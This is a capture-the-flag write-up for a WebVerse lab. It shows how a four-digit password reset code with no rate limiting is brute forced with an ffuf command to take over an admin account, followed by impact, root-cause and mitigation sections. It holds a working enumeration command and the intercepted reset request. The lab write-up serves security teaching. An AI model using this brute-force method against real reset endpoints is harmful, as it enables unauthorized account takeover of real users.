---
title: "Weak Password Reset – Brute Force of 4-Digit Reset Token Leading to Account Takeover | Heartwood Outfitters"
date: 2026-05-19 19:05:00 +0530
categories: [A07 - Authentication Failures, Weak Authentication]
tags: [weak-authentication, password-reset, brute-force, account-takeover, ffuf, authentication-bypass, credential-reset, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/heartwood-outfitters.webp
  alt: Heartwood Outfitters challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/challenges/spare-key

## Overview

Password reset functionality is commonly implemented to improve usability, but weak reset mechanisms frequently become direct paths to account compromise.

This challenge demonstrates how insufficient security controls around reset verification can allow an attacker to fully enumerate the token space and take over an account.

The application used a short numeric reset code without rate limiting, account lockout, or request throttling, making brute force practical.

## Objective

Obtain access to the target account by exploiting weaknesses in the password reset implementation.

---

## Scenario

*Heartwood Outfitters built their customer portal quickly and simplified their password reset process by replacing complex reset tokens with a four-digit code. The verification endpoint accepts unlimited attempts and includes no abuse protections.*

The small token space creates an immediately brute-forceable target.

---

## Reconnaissance

The login page required credentials:

```text
https://90beab5e-4065-spare-key-b66e7.challenges.webverselabs-pro.com/account/login
```

No credentials were initially available.

Searching through the application's exposed pages revealed an email address on the About page:

```text
https://90beab5e-4065-spare-key-b66e7.challenges.webverselabs-pro.com/about
```

Discovered email:

```text
admin@heartwood-outfitters.example
```

This provided a valid target account.

---

## Initiating Password Reset

Navigate to:

```text
Forgot Password
```

Submit the discovered email:

```text
admin@heartwood-outfitters.example
```

The application redirected to a reset verification form requiring a reset code.

Expected workflow:

```text
Enter your code
```

The code format was four numeric digits:

```text
0000-9999
```

Total possible combinations:

```text
10,000
```

A search space this small becomes practical to enumerate.

---

## Exploitation

Intercepting the reset request showed the following parameters:

```http
POST /account/reset HTTP/2

email=admin@heartwood-outfitters.example
code=XXXX
password=admin123
```

Because no protections existed, the code space could be brute forced.

FFUF payload:

```bash
ffuf \
-w <(seq -w 0000 9999):CODE \
-X POST \
-u "https://90beab5e-4065-spare-key-b66e7.challenges.webverselabs-pro.com/account/reset" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "email=admin%40heartwood-outfitters.example&code=CODE&password=admin123" \
-fw 1352 \
-fl 161
```

Explanation:

- `seq -w 0000 9999` generates all possible four-digit values
- `CODE` acts as the payload placeholder
- `-fw` filters repetitive word counts
- `-fl` filters repetitive line counts
- Successful responses become visible

---

## Successful Result

FFUF identified a response with different characteristics:

```text
0400 [Status: 302, Size: 727, Words: 23, Lines: 7]
```

The reset code:

```text
0400
```

The password was changed successfully:

```text
admin123
```

---

## Account Access

Authenticate using:

```text
admin@heartwood-outfitters.example : admin123
```

Login endpoint:

```text
https://90beab5e-4065-spare-key-b66e7.challenges.webverselabs-pro.com/account/login
```

After authentication, navigate to:

```text
https://90beab5e-4065-spare-key-b66e7.challenges.webverselabs-pro.com/account/dashboard
```

The dashboard exposed:

```text
WEBVERSE{....}
```

---

## Proof of Exploitation

Attack flow:

```text
About Page Email Discovery
            ↓
Forgot Password
            ↓
Reset Code Request
            ↓
Brute Force 0000–9999
            ↓
Reset Password
            ↓
Login as Admin
            ↓
Account Takeover
            ↓
Retrieve Flag
```

---

## Impact

Successful exploitation can result in:

- Full account takeover
- Unauthorized password changes
- Access to private user information
- Privilege escalation
- Administrative compromise
- Persistent account access

The issue becomes severe because no user interaction is required after reset initiation.

---

## Root Cause

The application suffered from multiple authentication weaknesses:

- Extremely small token space
- Predictable numeric reset values
- No rate limiting
- No account lockout
- No CAPTCHA
- Unlimited reset attempts
- Lack of abuse detection

---

## Mitigation

Applications should implement:

### Strong reset tokens

Avoid:

```text
1234
```

Prefer:

```text
3a7c8f2be917db53d41a0c
```

### Rate limiting

Example:

```text
Maximum:
5 attempts every 15 minutes
```

### Temporary account lockout

```text
Lock verification after repeated failures
```

### CAPTCHA

Prevent automated abuse.

### Token expiration

```text
Reset tokens valid for 5–10 minutes
```

### Monitoring

Alert on:

- Large numbers of reset attempts
- Sequential token guessing
- Unusual reset activity

---

## Real-World Insight

Weak password reset systems frequently become easier targets than login forms.

Common examples include:

```text
4-digit OTPs

Sequential tokens

Predictable timestamps

Unlimited verification attempts

Long-lived reset links
```

Organizations sometimes focus heavily on login security while overlooking reset workflows, creating an alternative path to account compromise.

---

## Vulnerability Identification

This challenge is primarily a weak authentication and account takeover issue.

Classification hierarchy:

**OWASP Category**  
A07: Identification and Authentication Failures

**Vulnerability Class**  
Weak Password Reset Mechanism

**Subtype**  
Reset Token Brute Force

**Specific Issue**  
Unlimited Enumeration of 4-Digit Password Reset Code Leading to Account Takeover

